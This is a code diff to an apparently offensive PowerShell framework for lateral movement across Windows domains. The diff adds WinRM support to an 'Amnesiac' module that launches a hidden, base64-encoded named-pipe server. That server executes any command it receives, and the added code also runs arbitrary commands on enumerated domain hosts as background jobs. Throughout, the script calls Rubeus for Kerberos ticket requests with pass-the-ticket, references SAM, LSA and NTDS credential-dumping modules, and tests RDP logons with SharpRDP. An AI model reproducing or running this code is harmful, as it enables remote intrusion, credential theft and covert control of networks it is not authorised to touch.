@@ -226,6 +226,7 @@ if ($Module -ne "") {
         "LSA" {}
         "NTDS" {}
         "SAM" {}
+        "Test"{}
         "Tickets" {}
 
         default {
@@ -696,6 +697,7 @@ if (!$CurrentUser) {
                 $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt"
             } else {
                 $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"
+
             }
         } elseif ($UserDomain -eq "") {
             if ($DomainController -ne "") {
@@ -1363,13 +1365,22 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 if ($Module -eq "Amnesiac"){
 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
 Write-Host "Amnesiac PID: $Global:AmnesiacPID"
+
 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
 Write-Host "PipeName: $Global:PN"
+
 $SID = $Global:SID
 $ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$ps.WaitForConnection();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
 $b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
+
+# Change the command string if the Method is WinRM
+if ($Method -eq "WinRM"){$finalString = "powershell.exe -EncodedCommand ""$b64ServerScript"""}
+
+else {
 $finalstring =  "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
 $finalstring = $finalstring -replace '"', "'"
+}
+
 $Command = $finalstring
 Start-sleep -seconds 2
 }
@@ -1456,6 +1467,8 @@ $b64 = "$Files"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
+
+
 
 elseif ($Module -eq "" -and $Command -ne ""){
 $base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
@@ -1703,7 +1716,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
-            $result = $result.trim()
+            try {$result = $result.Trim()} catch {}
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -2027,7 +2040,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
-            $result = $result.trim()
+            try {$result = $result.Trim()} catch {}
 
 
             # [other conditions for $result]
@@ -2136,7 +2149,7 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($computerName, $Command, $Timeout)
+    param ($computerName, $Command, $Timeout, $Module)
     
 $tcpClient = New-Object System.Net.Sockets.TcpClient
 $asyncResult = $tcpClient.BeginConnect($ComputerName, 5985, $null, $null)
@@ -2156,19 +2169,71 @@ if ($wait) {
 $tcpClient.Close()
 if (!$connected) {return "Unable to connect" }
       
-        try {
-        
-        if ($Command -eq ""){
-            return Invoke-Command -ComputerName $computerName -ScriptBlock  {echo "Successful Connection PME"}  -ErrorAction Stop
+try {
+    # Leave these comments here because its a clusterfuck
+    # Check if the module is "Amnesiac"
+    if ($Module -eq "Amnesiac") {
+        # Test the connection by invoking a simple echo command
+        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
+            echo "Successful Connection PME"
+        } -ErrorAction Stop
+
+        # If the test command succeeded, proceed with the actual command
+        if ($result) {
+            # Define a script block that will execute the command
+            $AscriptBlock = {
+                param($command)
+                Invoke-Expression $command
+            }
+
+            # Execute the command as a background job and ignore the job object
+            Invoke-Command -ComputerName $computerName -ScriptBlock $AscriptBlock -ArgumentList $Command -AsJob | Out-Null
+            # Return a success message
+            return "Successful Connection PME"
+        } else {
+            # If the test command failed, return an access denied message
+            return "Access Denied"
         }
-        elseif ($Command -ne ""){return Invoke-Command -ComputerName $computerName -ScriptBlock {Invoke-Expression $Using:Command} -ErrorAction Stop}
-        } catch {
-            if ($_.Exception.Message -like "*Access is Denied*") {
-                return "Access Denied"
-            } if ($_.Exception.Message -like "*cannot be resolved*") {
-                return "Unable to connect"
+    } elseif ($Command -eq "") {
+        # If the command is empty, execute a simple echo command
+        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
+            echo "Successful Connection PME"
+        } -ErrorAction Stop
+
+        # If the result is empty, ensure a success message is returned
+        if (-not $result) {
+            $result = "Successful Connection PME"
         }
+
+        # Return the result
+        return $result
+    } elseif ($Command -ne "") {
+        # If a command is provided, execute it
+        $result = Invoke-Command -ComputerName $computerName -ScriptBlock {
+            Invoke-Expression $Using:Command
+        } -ErrorAction Stop
+
+        # If the result is empty, ensure a success message is returned
+        if (-not $result) {
+            $result = "Successful Connection PME"
+        }
+
+        # Return the result
+        return $result
     }
+} catch {
+    # Handle exceptions based on their message
+    if ($_.Exception.Message -like "*Access is Denied*") {
+        return "Access Denied"
+    } elseif ($_.Exception.Message -like "*cannot be resolved*") {
+        return "Unable to connect"
+    } else {
+        return "Unspecified Error"
+    }
+}
+
+
+
 }
 
 # Create and invoke runspaces for each computer
@@ -2177,7 +2242,7 @@ foreach ($computer in $computers) {
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
     
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout).AddArgument($Module)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -2199,7 +2264,6 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
-            #$result = $result.trim()
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -2282,9 +2346,6 @@ do {
 
     Start-Sleep -Milliseconds 100
 } while ($runspaces | Where-Object { -not $_.Completed })
-
-
-
 
 
 # Clean up
@@ -2467,7 +2528,7 @@ function Display-ComputerStatus {
 if ($LocalAuth){$Domain = $ComputerName}
 if ($Password -ne ""){$result = Invoke-SharpRDP -Command "username=$Domain\$Username password=$Password computername=$ComputerName command='hostname'"}
            
-            $result = $result.Trim()
+            try {$result = $result.Trim()} catch {}
 
             $SuccessStatus = @('Success', 'STATUS_PASSWORD_MUST_CHANGE', 'LOGON_FAILED_UPDATE_PASSWORD', 'ARBITRATION_CODE_BUMP_OPTIONS', 'ARBITRATION_CODE_CONTINUE_LOGON', 'ARBITRATION_CODE_CONTINUE_TERMINATE', 'ARBITRATION_CODE_NOPERM_DIALOG', 'ARBITRATION_CODE_REFUSED_DIALOG', 'ARBITRATION_CODE_RECONN_OPTIONS')
             $DeniedStatus = @('ERROR_CODE_ACCESS_DENIED', 'LOGON_FAILED_BAD_PASSWORD', 'LOGON_FAILED_OTHER', 'LOGON_WARNING', 'STATUS_LOGON_FAILURE', 'SSL_ERR_LOGON_FAILURE', 'disconnectReasonByServer', 'disconnectReasonRemoteByUser')
